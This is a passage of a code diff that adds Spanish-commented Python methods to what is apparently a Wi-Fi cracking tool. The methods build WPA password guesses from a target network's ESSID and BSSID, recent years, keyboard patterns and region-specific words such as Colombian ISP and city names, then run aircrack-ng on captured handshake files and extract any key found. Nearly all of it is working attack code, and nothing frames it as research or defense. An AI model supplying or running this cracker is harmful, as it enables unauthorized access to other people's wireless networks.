+                password = self.quick_password_test_advanced(target, essid_numbers, "ESSID numérico")
+                if password:
+                    return password
+        
+        # 3. Fuerza bruta incremental (últimos 4 dígitos del año)
+        self.log("📅 Probando variaciones con años recientes...", "INFO")
+        year_patterns = []
+        base_name = essid.replace(' ', '').replace('-', '')[:4]
+        if len(base_name) >= 3:
+            for year in range(2020, 2025):
+                year_patterns.extend([
+                    f"{base_name}{year}",
+                    f"{year}{base_name}",
+                    f"{base_name}{year}123"
+                ])
+        
+        password = self.quick_password_test_advanced(target, year_patterns, "variaciones año")
+        if password:
+            return password
+        
+        return None
+    
+    def keyboard_pattern_attack(self, target, handshake_file):
+        """Ataques basados en patrones de teclado comunes"""
+        
+        # Patrones de teclado QWERTY
+        keyboard_patterns = [
+            # Filas horizontales
+            "qwertyui", "asdfghjk", "zxcvbnma", 
+            "12345678", "87654321", "qwerty123",
+            # Patrones diagonales
+            "qazwsxed", "plokijuh", "mnbvcxza",
+            # Patrones en L
+            "qwerasdf", "yuiophjk", "123qweas",
+            # Patrones comunes latinos
+            "qwertyuiop", "asdfghjkl", "password123",
+            "admin123", "usuario123", "internet123"
+        ]
+        
+        password = self.quick_password_test_advanced(target, keyboard_patterns, "patrones teclado")
+        if password:
+            return password
+        
+        # Patrones específicos por región (Colombia/Latinoamérica)
+        latin_patterns = [
+            "colombia123", "bogota123", "medellin123",
+            "internet2024", "claro123456", "movistar123",
+            "tigo123456", "virgin123", "une123456",
+            "familia123", "casa123456", "hogar12345"
+        ]
+        
+        password = self.quick_password_test_advanced(target, latin_patterns, "patrones latinos")
+        if password:
+            return password
+        
+        return None
+    
+    def mask_attack_essid_based(self, target, handshake_file):
+        """Ataques por máscara basados en el ESSID"""
+        essid = target['essid']
+        essid_clean = essid.replace(' ', '').replace('-', '').replace('_', '')
+        
+        self.log(f"🎭 Generando máscaras para: {essid}", "INFO")
+        
+        # Generar patrones basados en el ESSID
+        mask_patterns = []
+        
+        if len(essid_clean) >= 3:
+            base = essid_clean[:6] if len(essid_clean) >= 6 else essid_clean
+            
+            # Patrón: ESSID + números
+            for i in range(10, 100):
+                mask_patterns.extend([
+                    f"{base}{i}",
+                    f"{base}{i:02d}",
+                    f"{base}20{i:02d}" if i <= 24 else f"{base}19{i}"
+                ])
+            
+            # Patrón: ESSID + símbolos comunes
+            for symbol in ['123', '456', '789', '000', '111']:
+                mask_patterns.extend([
+                    f"{base}{symbol}",
+                    f"{base}_{symbol}",
+                    f"{base}-{symbol}"
+                ])
+        
+        # Limitar a patrones válidos (8-63 caracteres)
+        valid_patterns = [p for p in mask_patterns if 8 <= len(p) <= 63]
+        
+        if valid_patterns:
+            # Probar en lotes para eficiencia
+            for i in range(0, len(valid_patterns), 50):
+                batch = valid_patterns[i:i+50]
+                password = self.quick_password_test_advanced(target, batch, f"máscara lote {i//50+1}")
+                if password:
+                    return password
+        
+        return None
+    
+    def intelligent_mutations(self, target, handshake_file):
+        """Mutaciones inteligentes basadas en información del objetivo"""
+        essid = target['essid']
+        bssid = target['bssid']
+        
+        self.log("🧬 Aplicando mutaciones inteligentes...", "INFO")
+        
+        mutations = set()
+        base_words = [essid, essid.lower(), essid.upper()]
+        
+        # Eliminar espacios y caracteres especiales
+        for word in base_words:
+            clean_word = word.replace(' ', '').replace('-', '').replace('_', '')
+            if len(clean_word) >= 3:
+                mutations.add(clean_word)
+        
+        # Agregar mutaciones comunes
+        final_mutations = set()
+        for base in mutations:
+            if len(base) >= 3:
+                # Agregar números al final
+                for num in ['1', '12', '123', '1234', '12345', '123456', '2024', '2023']:
+                    candidate = base + num
+                    if 8 <= len(candidate) <= 63:
+                        final_mutations.add(candidate)
+                
+                # Agregar números al principio
+                for num in ['1', '123', '2024']:
+                    candidate = num + base
+                    if 8 <= len(candidate) <= 63:
+                        final_mutations.add(candidate)
+                
+                # Duplicar palabra
+                doubled = base + base
+                if 8 <= len(doubled) <= 63:
+                    final_mutations.add(doubled)
+                
+                # Reverso
+                reversed_word = base[::-1]
+                if len(reversed_word) >= 4:
+                    final_mutations.add(base + reversed_word)
+                
+                # Capitalización
+                if len(base) >= 4:
+                    final_mutations.add(base.capitalize() + '123')
+                    final_mutations.add(base.upper() + '2024')
+        
+        # Agregar variaciones basadas en BSSID
+        import re
+        bssid_numbers = ''.join(re.findall(r'\d', bssid))
+        if len(bssid_numbers) >= 4:
+            for base in list(final_mutations)[:10]:  # Solo las primeras 10
+                final_mutations.add(base + bssid_numbers[-4:])
+        
+        # Convertir a lista y probar
+        mutation_list = list(final_mutations)
+        if mutation_list:
+            # Ordenar por probabilidad (longitudes más comunes primero)
+            mutation_list.sort(key=lambda x: abs(len(x) - 10))
+            
+            # Probar en lotes
+            for i in range(0, len(mutation_list), 100):
+                batch = mutation_list[i:i+100]
+                password = self.quick_password_test_advanced(target, batch, f"mutaciones {i//100+1}")
+                if password:
+                    return password
+        
+        return None
+    
+    def quick_password_test_advanced(self, target, passwords, method_name):
+        """Prueba rápida de lista de contraseñas contra el handshake (versión avanzada)"""
+        if not passwords:
+            return None
+            
+        # Crear archivo temporal con contraseñas
+        temp_file = f"/tmp/test_{method_name.replace(' ', '_')}_{int(time.time())}.txt"
+        
+        try:
+            with open(temp_file, 'w') as f:
+                for pwd in passwords:
+                    if isinstance(pwd, str) and len(pwd) >= 8:
+                        f.write(pwd + '\n')
+            
+            self.log(f"🔍 Probando {len(passwords)} contraseñas con método: {method_name}", "INFO")
+            
+            # Buscar archivo de handshake en múltiples ubicaciones
+            handshake_files = [
+                f"handshakes/{target['essid']}_{target['bssid'].replace(':', '')}-01.cap",
+                f"/tmp/{target['essid']}-01.cap",
+                f"{target['essid']}_{target['bssid'].replace(':', '')}-01.cap"
+            ]
+            
+            handshake_file = None
+            for hf in handshake_files:
+                if os.path.exists(hf):
+                    handshake_file = hf
+                    break
+            
+            if not handshake_file:
+                self.log("No se encontró archivo de handshake", "WARNING")
+                return None
+            
+            # Ejecutar aircrack-ng con timeout más generoso
+            crack_cmd = f"aircrack-ng {handshake_file} -w {temp_file}"
+            success, output, _ = self.run_command(crack_cmd, timeout=120)
+            
+            if success and "KEY FOUND" in output:
+                # Extraer contraseña
+                import re
+                key_pattern = r'KEY FOUND! \[\s*(.+?)\s*\]'
+                match = re.search(key_pattern, output)
+                if match:
+                    password = match.group(1).strip()
+                    self.log(f"🎉 ¡CONTRASEÑA ENCONTRADA con {method_name}! → {password}", "SUCCESS")
+                    return password
+            
+        except Exception as e:
+            self.log(f"Error en {method_name}: {e}", "WARNING")
+        finally:
+            # Limpiar archivo temporal
+            try:
+                os.remove(temp_file)
+            except:
+                pass
+        
+        return None
 
     def _save_original_state(self):
         """Guardar estado original del sistema"""
